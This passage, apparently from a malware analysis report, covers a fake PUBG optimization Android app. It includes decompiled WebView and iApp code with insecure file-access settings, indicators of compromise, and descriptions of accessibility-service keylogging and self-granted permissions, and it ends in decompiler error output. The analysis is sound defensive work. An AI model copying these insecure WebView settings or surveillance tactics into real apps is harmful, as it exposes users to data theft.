        public void onClick(DialogInterface dialogInterface, int i2) {
            this.a.cancel();
        }
    }

    class m implements DialogInterface.OnClickListener {
        final /* synthetic */ JsResult a;

        m(Webview webview, JsResult jsResult) {
            this.a = jsResult;
        }

        @Override // android.content.DialogInterface.OnClickListener
        public void onClick(DialogInterface dialogInterface, int i2) {
            this.a.confirm();
        }
    }

    class n implements DialogInterface.OnCancelListener {
        final /* synthetic */ JsPromptResult a;

        n(Webview webview, JsPromptResult jsPromptResult) {
            this.a = jsPromptResult;
        }

        @Override // android.content.DialogInterface.OnCancelListener
        public void onCancel(DialogInterface dialogInterface) {
            this.a.cancel();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void a(String str) {
        Message message = new Message();
        message.what = 1;
        message.obj = str;
        this.m.sendMessage(message);
    }

    public static String getFilePathByContentResolver(Context context, Uri uri) {
        String string = null;
        if (uri == null) {
            return null;
        }
        Cursor cursorQuery = context.getContentResolver().query(uri, null, null, null, null);
        if (cursorQuery == null) {
            throw new IllegalArgumentException("Query on " + uri + " returns null result.");
        }
        try {
            if (cursorQuery.getCount() == 1 && cursorQuery.moveToFirst()) {
                string = cursorQuery.getString(cursorQuery.getColumnIndexOrThrow("_data"));
            }
            return string;
        } finally {
            cursorQuery.close();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void onHideCustomViewX() {
        FrameLayout frameLayout = this.g;
        if (frameLayout == null) {
            return;
        }
        Context context = frameLayout.getContext();
        ((ViewGroup) this.g.getParent()).removeView(this.g);
        if (context instanceof Activity) {
            ((Activity) context).getWindow().getDecorView().setSystemUiVisibility(this.h);
        }
        this.g.removeAllViews();
        this.g = null;
        WebChromeClient.CustomViewCallback customViewCallback = this.f1933i;
        if (customViewCallback != null) {
            customViewCallback.onCustomViewHidden();
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void onShowCustomViewX(Activity activity, View view, WebChromeClient.CustomViewCallback customViewCallback) {
        if (this.g != null) {
            customViewCallback.onCustomViewHidden();
            this.g = null;
            return;
        }
        FrameLayout frameLayout = new FrameLayout(activity);
        this.g = frameLayout;
        frameLayout.setLayoutParams(new ViewGroup.LayoutParams(-1, -1));
        this.g.setBackgroundColor(ViewCompat.MEASURED_STATE_MASK);
        Window window = activity.getWindow();
        this.h = window.getDecorView().getSystemUiVisibility();
        window.addContentView(this.g, new ViewGroup.LayoutParams(-1, -1));
        window.getDecorView().setSystemUiVisibility(5894);
        this.g.addView(view);
        this.f1933i = customViewCallback;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void r(String str) {
        Intent intent = new Intent();
        intent.setAction("android.intent.action.VIEW");
        if (str.toLowerCase().startsWith("file://")) {
            c.b.a.a.m.a(this, intent, new File(str), "text/html");
        } else {
            intent.setData(c.b.a.a.m.c(this, str));
        }
        startActivity(intent);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void s(String str) {
        new d(str).start();
    }

    public static void saveImageToGallery(Context context, File file) throws FileNotFoundException {
        try {
            MediaStore.Images.Media.insertImage(context.getContentResolver(), file.getAbsolutePath(), file.getName(), (String) null);
        } catch (FileNotFoundException e2) {
            e2.printStackTrace();
        }
        Intent intent = new Intent();
        intent.setAction("android.intent.action.MEDIA_SCANNER_SCAN_FILE");
        intent.setData(c.b.a.a.m.b(context, file));
        context.sendBroadcast(intent);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public boolean t(WebView webView, String str, String str2, JsResult jsResult) {
        new AlertDialog.Builder(webView.getContext()).setTitle("提示").setMessage(str2).setPositiveButton(R.string.ok, new j(this, jsResult)).setOnCancelListener(new i(this, jsResult)).create().show();
        return true;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public boolean u(WebView webView, String str, String str2, JsResult jsResult) {
        new AlertDialog.Builder(webView.getContext()).setTitle("提示").setMessage(str2).setPositiveButton("确定", new m(this, jsResult)).setNegativeButton("取消", new l(this, jsResult)).setOnCancelListener(new k(this, jsResult)).create().show();
        return true;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public boolean v(WebView webView, String str, String str2, String str3, JsPromptResult jsPromptResult) {
        EditText editText = new EditText(webView.getContext());
        editText.setText(str3);
        new AlertDialog.Builder(webView.getContext()).setTitle(str2).setView(editText).setPositiveButton("确定", new c(this, jsPromptResult, editText)).setNegativeButton("取消", new b(this, jsPromptResult)).setOnCancelListener(new n(this, jsPromptResult)).create().show();
        return true;
    }

    @TargetApi(11)
    private void w(WebView webView) {
        if (Build.VERSION.SDK_INT >= 11) {
            webView.removeJavascriptInterface("searchBoxJavaBridge_");
            webView.removeJavascriptInterface("accessibility");
            webView.removeJavascriptInterface("accessibilityTraversal");
        }
    }

    public void loadurl(WebView webView, String str) {
        this.e.startAnimation(this.f1932d);
        this.e.setVisibility(0);
        webView.loadUrl(str);
    }

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, android.app.Activity
    @SuppressLint({"NewApi"})
    protected void onActivityResult(int i2, int i3, Intent intent) {
        super.onActivityResult(i2, i3, intent);
        Uri data = (intent == null || i3 != -1) ? null : intent.getData();
        try {
            ValueCallback<Uri> valueCallback = this.k;
            if (valueCallback != null) {
                valueCallback.onReceiveValue(data);
            } else {
                ValueCallback<Uri[]> valueCallback2 = this.l;
                if (valueCallback2 != null) {
                    valueCallback2.onReceiveValue(WebChromeClient.FileChooserParams.parseResult(i3, intent));
                }
            }
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        this.k = null;
        this.l = null;
    }

    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    @SuppressLint({"SetJavaScriptEnabled"})
    @TargetApi(16)
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        Bundle extras = getIntent().getExtras();
        this.a = extras.getString("WebURL");
        setContentView(2131427454);
        Toolbar toolbar = (Toolbar) findViewById(2131231177);
        this.f = toolbar;
        setSupportActionBar(toolbar);
        String string = extras.getString("background");
        String string2 = extras.getString("backgroundShadow");
        if (string != null && string2 != null) {
            this.f.setBackgroundColor(Color.parseColor(string));
            c.b.a.a.t.c(this, Color.parseColor(string2), true, findViewById(2131231174));
        }
        ActionBar supportActionBar = getSupportActionBar();
        supportActionBar.setHomeButtonEnabled(true);
        supportActionBar.setDisplayShowHomeEnabled(true);
        supportActionBar.setDisplayHomeAsUpEnabled(true);
        this.f.setNavigationOnClickListener(new f());
        this.e = (ImageView) findViewById(2131231176);
        RotateAnimation rotateAnimation = new RotateAnimation(0.0f, 350.0f, 1, 0.5f, 1, 0.5f);
        this.f1932d = rotateAnimation;
        rotateAnimation.setDuration(1000L);
        this.f1932d.setRepeatCount(100);
        this.e.startAnimation(this.f1932d);
        WebView webView = (WebView) findViewById(2131231175);
        this.b = webView;
        int i2 = Build.VERSION.SDK_INT;
        if (i2 >= 21) {
            webView.getSettings().setMixedContentMode(0);
        }
        this.b.getSettings().setAllowFileAccess(true);
        this.b.getSettings().setJavaScriptEnabled(true);
        this.b.getSettings().setAppCacheEnabled(true);
        this.b.getSettings().setAppCachePath(getApplicationContext().getDir("cache", 0).getPath());
        this.b.getSettings().setAppCacheMaxSize(8388608L);
        this.b.getSettings().setDatabaseEnabled(true);
        this.b.getSettings().setDatabasePath(getApplicationContext().getDir("database", 0).getPath());
        this.b.getSettings().setDomStorageEnabled(true);
        this.b.getSettings().setGeolocationEnabled(true);
        this.b.getSettings().setLightTouchEnabled(true);
        this.b.getSettings().setCacheMode(-1);
        this.b.getSettings().setPluginState(WebSettings.PluginState.ON);
        this.b.getSettings().setSupportZoom(true);
        this.b.getSettings().setBuiltInZoomControls(true);
        this.b.getSettings().setUseWideViewPort(true);
        this.b.getSettings().setLoadWithOverviewMode(true);
        if (i2 >= 16) {
            this.b.getSettings().setAllowUniversalAccessFromFileURLs(true);
            this.b.getSettings().setAllowFileAccessFromFileURLs(true);
        }
        this.b.setScrollBarStyle(0);
        this.b.loadUrl(this.a);
        this.b.setDownloadListener(new a());
        this.b.setWebChromeClient(new g());
        this.b.setWebViewClient(new h());
        w(this.b);
    }

    @Override // android.app.Activity
    public boolean onCreateOptionsMenu(Menu menu) {
        menu.add(0, 0, 0, "后退");
        menu.add(0, 1, 1, "前进");
        menu.add(0, 2, 2, "刷新");
        menu.add(0, 3, 3, "下载");
        menu.add(0, 4, 4, "默认浏览器打开");
        menu.add(0, 5, 5, "关闭");
        return super.onCreateOptionsMenu(menu);
    }

    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, android.app.Activity
    protected void onDestroy() {
        super.onDestroy();
        this.f1932d.cancel();
        this.f1932d = null;
        this.e.clearAnimation();
    }

    @Override // androidx.appcompat.app.AppCompatActivity, android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyDown(int i2, KeyEvent keyEvent) {
        if (i2 != 4) {
            return i2 == 82;
        }
        if (this.g != null) {
            onHideCustomViewX();
            return true;
        }
        if (keyEvent.getRepeatCount() == 0) {
            if (this.b.canGoBack()) {
                this.b.goBack();
            } else {
                finish();
            }
        }
        return true;
    }

    @Override // android.app.Activity
    public boolean onOptionsItemSelected(MenuItem menuItem) {
        int itemId = menuItem.getItemId();
        if (itemId == 0) {
            this.b.goBack();
        } else if (itemId == 1) {
            this.b.goForward();
        } else if (itemId == 2) {
            WebView webView = this.b;
            loadurl(webView, webView.getUrl());
        } else if (itemId == 3) {
            Bundle extras = getIntent().getExtras();
            String string = extras.getString("background");
            String string2 = extras.getString("backgroundShadow");
            if (string == null || string2 == null) {
                startActivity(new Intent().setClass(this, DownList.class));
            } else {
                Intent intent = new Intent(this, (Class<?>) DownList.class);
                Bundle bundle = new Bundle();
                bundle.putString("background", string);
                bundle.putString("backgroundShadow", string2);
                intent.putExtras(bundle);
                startActivity(intent);
            }
        } else if (itemId == 4) {
            r(this.b.getUrl());
        } else if (itemId == 5) {
            finish();
        }
        return true;
    }

    public void synCookies(Context context, String str, String str2) {
        CookieSyncManager.createInstance(context);
        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        cookieManager.removeSessionCookie();
        cookieManager.setCookie(str, str2);
        CookieSyncManager.getInstance().sync();
    }
}
```

---

## **4. Payload Analysis (Internal `lib.so`)**

Based on string extraction from the native engine, the decrypted `lib.so` is a container for the **iApp (iyu)** source code, including:

* **`mian.iyu`**: The primary malicious controller.
* **`ays_service.myu`**: An Accessibility Service exploit used to capture keystrokes, SMS, and UI interactions.
* **`upload.lua`**: A Lua-based script for managing the exfiltration of stolen data to the C2 server.

---

## **5. Indicators of Compromise (IoCs)**

### **5.1. Network Indicators**

* **Domain:** `bu84.com`
* **URL Path:** `/config.php`, `/upload.php`

### **5.2. Host-Based Indicators (HBIs)**

| File/Directory Path | Classification |
| --- | --- |
| `assets/lib.so` | Encrypted Malicious Payload |
| `lib/arm64-v8a/libygsiyu.so` | Native Decryption Engine (YGS-Packer) |
| `/data/data/[pkg]/files/_RunDex_/` | Working directory for decrypted DEX |
| `[ExternalStorage]/.../log.txt` | Malware Execution Log |


## **6. Technical Deep Dive: Attack & Surveillance Tactics**

### **6.1. Persistence via Accessibility Service Hijacking**

The presence of `ays_service.myu` indicates the use of the **Android Accessibility Suite** as a primary attack vector.

* **UI Scripting:** The malware prompts the user to enable "Optimization Features" for PUBG. Once granted, the `ays_service` gains the ability to "read" the window content of other apps.
* **Keylogging:** By intercepting `AccessibilityEvent` types (such as `TYPE_VIEW_TEXT_CHANGED`), the malware captures keystrokes in banking apps, social media, and private messengers.
* **Automatic Permission Granting:** The native Lua engine can programmatically click "Allow" on system permission dialogs that pop up in the background, effectively self-escalating its own privileges.

```java
package com.iapp.app.run;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.res.Configuration;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.view.ContextMenu;
import android.view.GestureDetector;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.widget.AbsListView;
import android.widget.AdapterView;
import android.widget.CompoundButton;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.SeekBar;
import android.widget.TextView;
import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import androidx.core.view.ViewCompat;
import androidx.drawerlayout.widget.DrawerLayout;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import androidx.recyclerview.widget.StaggeredGridLayoutManager;
import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;
import androidx.viewpager.widget.ViewPager;
import c.b.a.a.w;
import com.google.android.material.appbar.AppBarLayout;
import com.google.android.material.tabs.TabLayout;
import com.iapp.app.Aid_luaCode;
import com.iapp.app.x5.WebView;
import fr.castorflex.android.verticalviewpager.VerticalViewPager;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import org.keplerproject.luajava.LuaException;

@SuppressLint({"UseSparseArrays"})
/* loaded from: /home/pana/dev/jadx-1.5.3/20260120_source_apk/classes.dex */
public class main extends iActivity {

    /* renamed from: c, reason: collision with root package name */
    private LinearLayout f1962c;
    public WebChromeClient.CustomViewCallback customViewCallback;
    public FrameLayout fullscreenContainer;
    private Aid_luaCode k;
    public com.iapp.app.d luaj;
    public int originalSystemUiVisibility;

    /* renamed from: d, reason: collision with root package name */
    private HashMap<String, Object> f1963d = new HashMap<>();
    private String[] e = null;
    private c.c.a.b f = new c.c.a.b(this);
    private String g = null;
    public String r = null;
    private SensorEventListener h = null;

    /* renamed from: i, reason: collision with root package name */
    private SensorManager f1964i = null;
    private Sensor j = null;
    private String l = "require 'import'\n";
    private boolean m = false;
    private boolean n = false;
    private boolean o = false;
    private boolean p = false;
    private boolean q = false;
    private boolean s = false;
    private boolean t = false;
    private boolean u = false;
    private boolean v = false;
    private boolean w = false;
    private boolean x = false;
    private boolean y = false;
    private boolean z = false;
    private boolean A = false;
    private boolean B = false;
    private boolean C = false;

    class a implements AbsListView.OnScrollListener {
        final /* synthetic */ boolean a;
        final /* synthetic */ boolean b;

        a(boolean z, boolean z2) {
            this.a = z;
            this.b = z2;
        }

        @Override // android.widget.AbsListView.OnScrollListener
        public void onScroll(AbsListView absListView, int i2, int i3, int i4) {
            if (this.b) {
                int id = absListView.getId();
                main.this.luaj.d("onscroll" + id, Integer.valueOf(id), absListView, Integer.valueOf(i2), Integer.valueOf(i3), Integer.valueOf(i4));
            }
        }

        @Override // android.widget.AbsListView.OnScrollListener
        public void onScrollStateChanged(AbsListView absListView, int i2) {
            if (this.a) {
                int id = absListView.getId();
                main.this.luaj.d("onscrollstatechanged" + id, Integer.valueOf(id), absListView, Integer.valueOf(i2));
            }
        }
    }

    class b implements AdapterView.OnItemClickListener {
        b() {
        }

        @Override // android.widget.AdapterView.OnItemClickListener
        public void onItemClick(AdapterView<?> adapterView, View view, int i2, long j) {
            int id = adapterView.getId();
            main.this.luaj.d("clickitem" + id, Integer.valueOf(id), adapterView, Integer.valueOf(i2), Long.valueOf(j), view);
        }
    }

    class c implements AdapterView.OnItemSelectedListener {
        final /* synthetic */ boolean a;
        final /* synthetic */ boolean b;

        c(boolean z, boolean z2) {
            this.a = z;
            this.b = z2;
        }

        @Override // android.widget.AdapterView.OnItemSelectedListener
        public void onItemSelected(AdapterView<?> adapterView, View view, int i2, long j) {
            if (this.a) {
                int id = adapterView.getId();
                main.this.luaj.d("onitemselected" + id, Integer.valueOf(id), adapterView, view, Integer.valueOf(i2), Long.valueOf(j));
            }
        }

        @Override // android.widget.AdapterView.OnItemSelectedListener
        public void onNothingSelected(AdapterView<?> adapterView) {
            if (this.b) {
                int id = adapterView.getId();
                main.this.luaj.d("onnothingselected" + id, Integer.valueOf(id), adapterView);
            }
        }
    }

    class d implements SeekBar.OnSeekBarChangeListener {
        final /* synthetic */ boolean a;
        final /* synthetic */ boolean b;

        /* renamed from: c, reason: collision with root package name */
        final /* synthetic */ boolean f1967c;

        d(boolean z, boolean z2, boolean z3) {
            this.a = z;
            this.b = z2;
            this.f1967c = z3;
        }

        @Override // android.widget.SeekBar.OnSeekBarChangeListener
        public void onProgressChanged(SeekBar seekBar, int i2, boolean z) {
            if (this.f1967c) {
                int id = seekBar.getId();
                main.this.luaj.d("onprogresschanged2" + id, Integer.valueOf(id), seekBar, Integer.valueOf(i2), Boolean.valueOf(z));
            }
        }

        @Override // android.widget.SeekBar.OnSeekBarChangeListener
        public void onStartTrackingTouch(SeekBar seekBar) {
            if (this.b) {
                int id = seekBar.getId();
                main.this.luaj.d("onstarttrackingtouch" + id, Integer.valueOf(id), seekBar);
            }
        }

        @Override // android.widget.SeekBar.OnSeekBarChangeListener
        public void onStopTrackingTouch(SeekBar seekBar) {
            if (this.a) {
                int id = seekBar.getId();
                main.this.luaj.d("onstoptrackingtouch" + id, Integer.valueOf(id), seekBar);
            }
        }
    }

    class e implements TabLayout.OnTabSelectedListener {
        final /* synthetic */ boolean a;
        final /* synthetic */ View b;

        /* renamed from: c, reason: collision with root package name */
        final /* synthetic */ boolean f1969c;

        /* renamed from: d, reason: collision with root package name */
        final /* synthetic */ boolean f1970d;

        e(boolean z, View view, boolean z2, boolean z3) {
            this.a = z;
            this.b = view;
            this.f1969c = z2;
            this.f1970d = z3;
        }

        @Override // com.google.android.material.tabs.TabLayout.BaseOnTabSelectedListener
        public void onTabReselected(TabLayout.Tab tab) {
            if (this.f1970d) {
                int id = this.b.getId();
                main.this.luaj.d("ontabreselected" + id, Integer.valueOf(id), this.b, Integer.valueOf(tab.getPosition()), String.valueOf(tab.getText()), tab);
            }
        }

        @Override // com.google.android.material.tabs.TabLayout.BaseOnTabSelectedListener
        public void onTabSelected(TabLayout.Tab tab) {
            if (this.a) {
                int id = this.b.getId();
                main.this.luaj.d("ontabselected" + id, Integer.valueOf(id), this.b, Integer.valueOf(tab.getPosition()), String.valueOf(tab.getText()), tab);
            }
        }

        @Override // com.google.android.material.tabs.TabLayout.BaseOnTabSelectedListener
        public void onTabUnselected(TabLayout.Tab tab) {
            if (this.f1969c) {
                int id = this.b.getId();
                main.this.luaj.d("ontabunselected" + id, Integer.valueOf(id), this.b, Integer.valueOf(tab.getPosition()), String.valueOf(tab.getText()), tab);
            }
        }
    }

    class f extends RecyclerView.OnScrollListener {
        final /* synthetic */ boolean a;
        final /* synthetic */ boolean b;

        f(boolean z, boolean z2) {
            this.a = z;
            this.b = z2;
        }

        @Override // androidx.recyclerview.widget.RecyclerView.OnScrollListener
        public void onScrollStateChanged(RecyclerView recyclerView, int i2) {
            if (this.a) {
                int id = recyclerView.getId();
                main.this.luaj.d("onscrollstatechanged" + id, Integer.valueOf(id), recyclerView, Integer.valueOf(i2));
            }
        }

        @Override // androidx.recyclerview.widget.RecyclerView.OnScrollListener
        public void onScrolled(RecyclerView recyclerView, int i2, int i3) {
            if (this.b) {
                RecyclerView.LayoutManager layoutManager = recyclerView.getLayoutManager();
                int childCount = layoutManager.getChildCount();
                int itemCount = layoutManager.getItemCount();
                int iFindFirstVisibleItemPosition = -1;
                boolean z = false;
                if (layoutManager instanceof LinearLayoutManager) {
                    iFindFirstVisibleItemPosition = ((LinearLayoutManager) layoutManager).findFirstVisibleItemPosition();
                } else if (layoutManager instanceof StaggeredGridLayoutManager) {
                    StaggeredGridLayoutManager staggeredGridLayoutManager = (StaggeredGridLayoutManager) layoutManager;
                    if (staggeredGridLayoutManager.getSpanCount() > 0) {
                        iFindFirstVisibleItemPosition = staggeredGridLayoutManager.findFirstVisibleItemPositions(null)[0];
                    }
                }
                int id = recyclerView.getId();
                com.iapp.app.d dVar = main.this.luaj;
                String str = "onscrolled" + id;
                Object[] objArr = new Object[8];
                objArr[0] = Integer.valueOf(id);
                objArr[1] = recyclerView;
                objArr[2] = Integer.valueOf(iFindFirstVisibleItemPosition);
                objArr[3] = Integer.valueOf(childCount);
                objArr[4] = Integer.valueOf(itemCount);
                objArr[5] = Integer.valueOf(i2);
                objArr[6] = Integer.valueOf(i3);
                if (i3 > 0 && childCount + iFindFirstVisibleItemPosition >= itemCount) {
                    z = true;
                }
                objArr[7] = Boolean.valueOf(z);
                dVar.d(str, objArr);
            }
        }
    }

    class g extends GestureDetector.SimpleOnGestureListener {
        final /* synthetic */ boolean a;
        final /* synthetic */ View b;

        g(boolean z, View view) {
            this.a = z;
            this.b = view;
        }

        @Override // android.view.GestureDetector.SimpleOnGestureListener, android.view.GestureDetector.OnGestureListener
        public void onLongPress(MotionEvent motionEvent) {
            RecyclerView recyclerView;
            View viewFindChildViewUnder;
            if (!this.a || (viewFindChildViewUnder = (recyclerView = (RecyclerView) this.b).findChildViewUnder(motionEvent.getX(), motionEvent.getY())) == null) {
                return;
            }
            int id = recyclerView.getId();
            main.this.luaj.d("clickitem" + id, Integer.valueOf(id), recyclerView, Integer.valueOf(recyclerView.getChildLayoutPosition(viewFindChildViewUnder)), viewFindChildViewUnder);
        }

        @Override // android.view.GestureDetector.SimpleOnGestureListener, android.view.GestureDetector.OnGestureListener
        public boolean onSingleTapUp(MotionEvent motionEvent) {
            RecyclerView recyclerView;
            View viewFindChildViewUnder;
            if (!this.a || (viewFindChildViewUnder = (recyclerView = (RecyclerView) this.b).findChildViewUnder(motionEvent.getX(), motionEvent.getY())) == null) {
                return false;
            }
            int id = recyclerView.getId();
            main.this.luaj.d("clickitem" + id, Integer.valueOf(id), recyclerView, Integer.valueOf(recyclerView.getChildLayoutPosition(viewFindChildViewUnder)), viewFindChildViewUnder);
            return true;
        }
    }

    class h implements RecyclerView.OnItemTouchListener {
        final /* synthetic */ GestureDetector a;

        h(main mainVar, GestureDetector gestureDetector) {
            this.a = gestureDetector;
        }

        @Override // androidx.recyclerview.widget.RecyclerView.OnItemTouchListener
        public boolean onInterceptTouchEvent(RecyclerView recyclerView, MotionEvent motionEvent) {
            this.a.onTouchEvent(motionEvent);
            return false;
        }

        @Override // androidx.recyclerview.widget.RecyclerView.OnItemTouchListener
        public void onRequestDisallowInterceptTouchEvent(boolean z) {
        }

        @Override // androidx.recyclerview.widget.RecyclerView.OnItemTouchListener
        public void onTouchEvent(RecyclerView recyclerView, MotionEvent motionEvent) {
        }
    }

    class i implements ViewPager.OnPageChangeListener {
        final /* synthetic */ boolean a;
        final /* synthetic */ View b;

        /* renamed from: c, reason: collision with root package name */
        final /* synthetic */ boolean f1973c;

        /* renamed from: d, reason: collision with root package name */
        final /* synthetic */ boolean f1974d;

        i(boolean z, View view, boolean z2, boolean z3) {
            this.a = z;
            this.b = view;
            this.f1973c = z2;
            this.f1974d = z3;
        }

        @Override // androidx.viewpager.widget.ViewPager.OnPageChangeListener
        public void onPageScrollStateChanged(int i2) {
            if (this.f1974d) {
                int id = this.b.getId();
                main.this.luaj.d("onpagescrollstatechanged" + id, Integer.valueOf(id), this.b, Integer.valueOf(i2));
            }
        }

        @Override // androidx.viewpager.widget.ViewPager.OnPageChangeListener
        public void onPageScrolled(int i2, float f, int i3) {
            if (this.f1973c) {
                int id = this.b.getId();
                main.this.luaj.d("onpagescrolled" + id, Integer.valueOf(id), this.b, Integer.valueOf(i2), Float.valueOf(f), Integer.valueOf(i3));
            }
        }

        @Override // androidx.viewpager.widget.ViewPager.OnPageChangeListener
        public void onPageSelected(int i2) {
            if (this.a) {
                int id = this.b.getId();
                main.this.luaj.d("onpageselected" + id, Integer.valueOf(id), this.b, Integer.valueOf(i2));
            }
        }
    }

    class j implements SwipeRefreshLayout.OnRefreshListener {
        final /* synthetic */ boolean a;
        final /* synthetic */ View b;

        j(boolean z, View view) {
            this.a = z;
            this.b = view;
        }

        @Override // androidx.swiperefreshlayout.widget.SwipeRefreshLayout.OnRefreshListener
        public void onRefresh() {
            if (this.a) {
                int id = this.b.getId();
                main.this.luaj.d("onrefresh" + id, Integer.valueOf(id), this.b);
            }
        }
    }

    class k implements com.iapp.app.x5.a {
        k(main mainVar) {
        }

        @Override // android.webkit.DownloadListener
        public void onDownloadStart(String str, String str2, String str3, String str4, long j) {
            String lowerCase = str4.toLowerCase();
            String strC = str3 != null ? c.b.a.a.r.c(str3, "filename=\"", "\"") : null;
            if (strC == null) {
                if (str.contains("?")) {
                    str = str.substring(0, str.indexOf(63));
                }
                strC = c.b.a.a.r.b(str);
                String lowerCase2 = strC.toLowerCase();
                if (lowerCase.equals("application/vnd.android.package-archive") && !lowerCase2.endsWith(".apk")) {
                    strC = strC + ".apk";
                }
            }
            if (strC != null) {
                com.iapp.app.a.b.d(str, strC, null);
            }
        }
    }

    class l implements CompoundButton.OnCheckedChangeListener {
        final /* synthetic */ boolean a;
        final /* synthetic */ View b;

        l(boolean z, View view) {
            this.a = z;
            this.b = view;
        }

        @Override // android.widget.CompoundButton.OnCheckedChangeListener
        public void onCheckedChanged(CompoundButton compoundButton, boolean z) {
            if (this.a) {
                int id = this.b.getId();
                main.this.luaj.d("oncheckedchanged" + id, Integer.valueOf(id), this.b, Boolean.valueOf(z));
            }
        }
    }

    class m implements AppBarLayout.OnOffsetChangedListener {
        final /* synthetic */ boolean a;

        m(boolean z) {
            this.a = z;
        }

        @Override // com.google.android.material.appbar.AppBarLayout.OnOffsetChangedListener, com.google.android.material.appbar.AppBarLayout.BaseOnOffsetChangedListener
        public void onOffsetChanged(AppBarLayout appBarLayout, int i2) {
            if (this.a) {
                int id = appBarLayout.getId();
                main.this.luaj.d("onoffsetchanged" + id, Integer.valueOf(id), appBarLayout, Integer.valueOf(i2));
            }
        }
    }

    class n implements SensorEventListener {
        n() {
        }

        @Override // android.hardware.SensorEventListener
        public void onAccuracyChanged(Sensor sensor, int i2) {
        }

        @Override // android.hardware.SensorEventListener
        public void onSensorChanged(SensorEvent sensorEvent) {
            main.this.luaj.d("sensor", Float.valueOf(sensorEvent.values[0]), Float.valueOf(sensorEvent.values[1]), Float.valueOf(sensorEvent.values[2]));
        }
    }

    class o implements View.OnClickListener {
        o() {
        }

        @Override // android.view.View.OnClickListener
        public void onClick(View view) {
            int id = view.getId();
            main.this.luaj.d("clicki" + id, Integer.valueOf(id), view);
        }
    }

    class p implements View.OnTouchListener {
        p() {
        }

        @Override // android.view.View.OnTouchListener
        @SuppressLint({"ClickableViewAccessibility"})
        public boolean onTouch(View view, MotionEvent motionEvent) {
            int id = view.getId();
            return main.this.luaj.e("touchmonitor" + id, Integer.valueOf(id), view, Integer.valueOf(motionEvent.getAction()), Float.valueOf(motionEvent.getX()), Float.valueOf(motionEvent.getY()), Float.valueOf(motionEvent.getRawX()), Float.valueOf(motionEvent.getRawY()));
        }
    }

    class q implements View.OnLongClickListener {
        q() {
        }

        @Override // android.view.View.OnLongClickListener
        public boolean onLongClick(View view) {
            int id = view.getId();
            return main.this.luaj.e("press" + id, Integer.valueOf(id), view);
        }
    }

    class r implements View.OnKeyListener {
        r() {
        }

        @Override // android.view.View.OnKeyListener
        public boolean onKey(View view, int i2, KeyEvent keyEvent) {
            int id = view.getId();
            return main.this.luaj.e("keyboard" + id, Integer.valueOf(id), view, Integer.valueOf(i2), Integer.valueOf(keyEvent.getAction()), Integer.valueOf(keyEvent.getRepeatCount()), keyEvent);
        }
    }

    class s implements View.OnCreateContextMenuListener {
        s() {
        }

        @Override // android.view.View.OnCreateContextMenuListener
        public void onCreateContextMenu(ContextMenu contextMenu, View view, ContextMenu.ContextMenuInfo contextMenuInfo) {
            String strC = c.b.a.a.r.c(((Object[]) view.getTag())[2].toString(), "<eventItme type=\"pressmenu\">", "</eventItme>");
            contextMenu.setHeaderTitle(c.b.a.a.r.c(strC, "title:", "\n"));
            int id = view.getId();
            String[] strArrSplit = strC.split("\ncase ");
            for (int i2 = 1; i2 < strArrSplit.length; i2++) {
                contextMenu.add(id, i2, 0, c.b.a.a.r.c(strArrSplit[i2], null, ":"));
            }
            if (c.b.a.a.r.c(strC, "\ndefault:", "\nbreak") != null) {
                main.this.luaj.d("onCreateContextMenu" + id + "x0", Integer.valueOf(id), view);
            }
        }
    }

    class t implements TextView.OnEditorActionListener {
        t() {
        }

        /*  JADX ERROR: ConcurrentModificationException in pass: ConstructorVisitor
            java.util.ConcurrentModificationException
            	at java.base/java.util.ArrayList$Itr.checkForComodification(ArrayList.java:1096)
            	at java.base/java.util.ArrayList$Itr.next(ArrayList.java:1050)
            	at jadx.core.dex.visitors.ConstructorVisitor.insertPhiInsn(ConstructorVisitor.java:139)
            	at jadx.core.dex.visitors.ConstructorVisitor.processInvoke(ConstructorVisitor.java:91)
            	at jadx.core.dex.visitors.ConstructorVisitor.replaceInvoke(ConstructorVisitor.java:56)
            	at jadx.core.dex.visitors.ConstructorVisitor.visit(ConstructorVisitor.java:42)
            */
        @Override // android.widget.TextView.OnEditorActionListener
        public boolean onEditorAction(
        /*  JADX ERROR: ConcurrentModificationException in pass: ConstructorVisitor
            java.util.ConcurrentModificationException
            	at java.base/java.util.ArrayList$Itr.checkForComodification(ArrayList.java:1096)
            	at java.base/java.util.ArrayList$Itr.next(ArrayList.java:1050)
            	at jadx.core.dex.visitors.ConstructorVisitor.insertPhiInsn(ConstructorVisitor.java:139)
            	at jadx.core.dex.visitors.ConstructorVisitor.processInvoke(ConstructorVisitor.java:91)
            	at jadx.core.dex.visitors.ConstructorVisitor.replaceInvoke(ConstructorVisitor.java:56)
            */
        /*  JADX ERROR: Method generation error
            jadx.core.utils.exceptions.JadxRuntimeException: Code variable not set in r13v0 ??
            	at jadx.core.dex.instructions.args.SSAVar.getCodeVar(SSAVar.java:236)
